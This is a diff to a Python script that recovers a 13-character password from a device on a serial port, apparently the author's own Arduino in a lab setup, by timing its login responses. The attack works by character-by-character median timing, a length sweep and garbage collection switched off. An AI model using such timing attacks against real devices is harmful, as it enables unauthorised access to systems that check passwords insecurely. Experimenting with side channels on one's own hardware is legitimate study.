@@ -4,27 +4,43 @@ import statistics
 import serial 
 import random
 from operator import itemgetter
+import gc
+gc.disable()
 
 TOKEN_SIZE = 13
 
 arduino = serial.Serial(port='/dev/cu.usbserial-110', baudrate=115200, timeout=1)
 
-def test(characters):
+
+def read_until_prompt():
     res = ""
     while "password" not in res:
-        res = arduino.readline().decode()
+        byte = arduino.read(1)
+        if not byte:
+            return False, res
+        res += byte.decode(errors="replace")
+    return True, res 
 
-    time.sleep(0.0002)
+def test(characters):
+    ok, prompt = read_until_prompt()
+    if not ok:
+        raise TimeoutError(f"Did not receive password prompt. Got: {prompt!r}")
+
+    time.sleep(0.020)
     arduino.reset_input_buffer()
 
-    arduino.write(bytes(characters+"\r\n", "utf-8"))
-    arduino.flush()
     before = time.perf_counter_ns()
+    arduino.write((characters + "\n").encode("utf-8"))
+    arduino.flush()
 
-    arduino.read(1)
+    res = ""
+    while "Login failure" not in res:
+        chunk = arduino.read(1)
+        if not chunk:
+            raise TimeoutError(f"Timed out waiting for login response for {characters!r}")
+        res += chunk.decode(errors="replace")
 
     after = time.perf_counter_ns()
-
     return after - before
 
 def try_to_hack(characters, test_by_length): 
@@ -40,7 +56,7 @@ def try_to_hack(characters, test_by_length):
     return deltas
 
 def find_next_character(base):
-    measures = []
+    res = []
 
     test_by_length = base + "x" * (TOKEN_SIZE - len(base))
 
@@ -49,49 +65,36 @@ def find_next_character(base):
         timings = try_to_hack(base + character + "a" * (TOKEN_SIZE - len(base) - 1), test_by_length)
 
         median = statistics.median(timings)
-        min_timing = min(timings)
-        max_timing = max(timings)
-        stddev = statistics.stdev(timings)
+        res.append((character, median))
+    
+    res.sort(key=lambda r: r[1], reverse=True)
+    best_char, best_delta = res[0]
 
-        measures.append({'character': character, 'median': median, 'min': min_timing,
-                         'max': max_timing, 'stddev': stddev})
+    print(f"Position {len(base) + 1}: best={best_char!r} ({best_delta / 1000:.0f} us median)")
+    for char, delta in res[1:4]:
+        print(f"  {char!r}: {delta / 1000:.0f} us median")
 
-    sorted_measures = list(sorted(measures, key=itemgetter('median'), reverse=True))
-
-    found_character = sorted_measures[0]
-    top_characters = sorted_measures[1:4]
-
-    print("Found character at position %s: %r" % ((len(base) + 1), found_character['character']))
-    msg = "median: %s Max: %s Min: %s Stddev: %s"
-    print(msg % (found_character['median'], found_character['max'], found_character['min'], found_character['stddev']))
-
-    print()
-    print("Following characters were:")
-
-    for top_character in top_characters:
-        ratio = int((1 - (top_character['median'] / found_character['median'])) * 100)
-        msg ="Character: %r median: %s Max: %s Min: %s Stddev: %s (%d%% faster)"
-        print(msg % (top_character['character'], top_character['median'], top_character['max'], top_character['min'], top_character['stddev'], ratio))
-
-    return found_character['character']
+    return best_char
 
 def find_size():
-    for i in range(21):
-        if i == 0:
-            continue
-        timings = try_to_hack("A" * i)
-        print(i, timings)
+    print("Length sweep")
+    for length in range(1, 21):
+        candidate = "X" * length
+        elapsed = test(candidate)
+        print(f"{length} {elapsed / 1000:.0f} us")
 
 def main():
+    arduino.setDTR(False)
+    time.sleep(0.1)
+    arduino.setDTR(True)
     time.sleep(2)
+
     arduino.write(b'hello\r\n')
     arduino.readline()
     time.sleep(2)
 
-
     base = ''
-    #for i in range(50):
-     #   find_size()
+    find_size()
 
     while len(base) != TOKEN_SIZE:
         next_character = find_next_character(base)
